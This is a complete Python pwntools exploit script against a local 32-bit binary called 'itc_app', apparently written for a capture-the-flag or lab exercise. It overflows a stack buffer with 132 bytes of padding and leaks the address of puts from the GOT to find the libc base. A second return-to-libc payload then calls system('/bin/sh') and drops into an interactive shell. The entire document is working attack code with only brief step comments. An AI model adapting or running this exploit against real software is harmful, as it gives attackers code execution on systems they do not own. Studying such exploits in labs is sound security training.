from pwn import *

# Set up the binary and libc objects
elf = context.binary = ELF('./itc_app')
libc = elf.libc

# Start the process
p = process()

# Initial output handling
try:
    initial_output = p.recvuntil('>', timeout=5)
    print("Initial output:", initial_output.decode())
except EOFError:
    print("Did not receive initial prompt. Exiting.")
    p.close()
    exit()

# Build the first payload to leak the address of puts from GOT
payload = flat(
    b'A' * 132,
    elf.plt['puts'],  # puts@plt
    elf.sym['main'],  # Return to main for a second round
    elf.got['puts']   # puts@got to leak its address
)

# Send the first payload
p.sendline(payload)

# Receive the leaked address
puts_leak = u32(p.recv(4))
p.recvline()  # Consume any extra output to clear the buffer

# Calculate libc base
libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

# Building the second payload for invoking system("/bin/sh")
payload = flat(
    b'A' * 132,
    libc.sym['system'],  # system() address in libc
    0xdeadbeef,  # Fake return address after system()
    next(libc.search(b'/bin/sh\x00'))  # Pointer to "/bin/sh" string in libc
)

# Send the second payload
p.sendline(payload)

# Go interactive
try:
    p.interactive()
except EOFError:
    print("Got EOF while trying to go interactive. The process might have exited.")
    p.close()
